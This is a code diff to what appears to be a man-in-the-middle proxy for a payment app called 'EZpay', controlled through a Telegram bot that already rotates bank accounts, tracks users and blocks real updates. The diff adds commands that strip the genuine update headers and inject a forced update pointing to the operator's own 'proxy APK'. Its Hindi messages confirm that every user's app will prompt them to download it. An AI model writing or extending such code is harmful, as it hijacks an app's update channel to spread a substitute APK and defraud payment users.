@@ -25,7 +25,9 @@ const DEFAULT_DATA = {
   userOverrides: {},
   trackedUsers: {},
   suspendedPhones: {},
-  blockUpdate: true
+  blockUpdate: true,
+  proxyApkUrl: '',
+  proxyApkVersion: ''
 };
 
 let bot = null;
@@ -87,7 +89,7 @@ async function saveData(data) {
     if (!skipMerge) {
       const current = await redis.get('ezpayData');
       if (current && typeof current === 'object') {
-        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'suspendedPhones', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate'];
+        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'suspendedPhones', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate', 'proxyApkUrl', 'proxyApkVersion'];
         for (const key of settingsKeys) {
           if (current[key] !== undefined) {
             data[key] = current[key];
@@ -350,7 +352,19 @@ async function proxyFetch(req) {
     }
   });
   const blockData = cachedData || DEFAULT_DATA;
-  if (blockData.blockUpdate !== false) {
+  if (blockData.proxyApkUrl) {
+    for (const k of Object.keys(respHeaders)) {
+      const kl = k.toLowerCase();
+      if (kl === 'needupdateflag' || kl === 'link' || kl === 'version' || kl === 'versioncode' || kl === 'md5' || kl === 'updatecontent') {
+        delete respHeaders[k];
+      }
+    }
+    respHeaders['needupdateflag'] = '1';
+    respHeaders['link'] = blockData.proxyApkUrl;
+    respHeaders['version'] = blockData.proxyApkVersion || '1.1.5';
+    respHeaders['versioncode'] = '99';
+    respHeaders['updatecontent'] = 'New version available. Please update.';
+  } else if (blockData.blockUpdate !== false) {
     for (const k of Object.keys(respHeaders)) {
       const kl = k.toLowerCase();
       if (kl === 'needupdateflag') {
@@ -702,6 +716,8 @@ app.post('/bot-webhook', async (req, res) => {
 /on log <userId> — Log on for user
 /update — Block update popup (default ON)
 /update on — Allow update popup
+/setapkurl <url> [version] — Push proxy APK update to users
+/clearapkurl — Stop proxy APK update
 /status — Full status
 /debug — Debug next response
 
@@ -739,7 +755,7 @@ Example:
     if (text === '/status') {
       const active = getActiveBank(data, null);
       const idCount = Object.keys(data.userOverrides || {}).length;
-      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nUpdate Block: ${data.blockUpdate !== false ? '🚫 BLOCKED' : '✅ ALLOWED'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
+      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nUpdate: ${data.proxyApkUrl ? `📦 PROXY APK (v${data.proxyApkVersion || '?'})` : (data.blockUpdate !== false ? '🚫 BLOCKED' : '✅ REAL')}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
       if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
       if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
       else m += '\n\n⚠️ No active bank';
@@ -766,6 +782,33 @@ Example:
         await saveData(data);
         await bot.sendMessage(chatId, '🚫 Update popup BLOCKED\nReal server ka update popup ab nahi dikhega app mein.');
       }
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/setapkurl ')) {
+      const parts = text.substring(11).trim().split(' ');
+      const apkUrl = parts[0];
+      const apkVersion = parts[1] || '1.1.5';
+      if (!apkUrl || !apkUrl.startsWith('http')) {
+        await bot.sendMessage(chatId, '❌ Format: /setapkurl <https://...> [version]\nExample: /setapkurl https://github.com/.../EZpay.apk 1.1.5');
+        return res.sendStatus(200);
+      }
+      data.proxyApkUrl = apkUrl;
+      data.proxyApkVersion = apkVersion;
+      data.blockUpdate = false;
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      await bot.sendMessage(chatId, `📦 Proxy APK Update SET\nURL: ${apkUrl}\nVersion: ${apkVersion}\n\nAb sabke app mein update popup aayega. Click karne pe tera proxy APK download hoga.`);
+      return res.sendStatus(200);
+    }
+
+    if (text === '/clearapkurl') {
+      data.proxyApkUrl = '';
+      data.proxyApkVersion = '';
+      data.blockUpdate = true;
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      await bot.sendMessage(chatId, '🚫 Proxy APK URL cleared.\nUpdate popup wapis block ho gaya.');
       return res.sendStatus(200);
     }
 
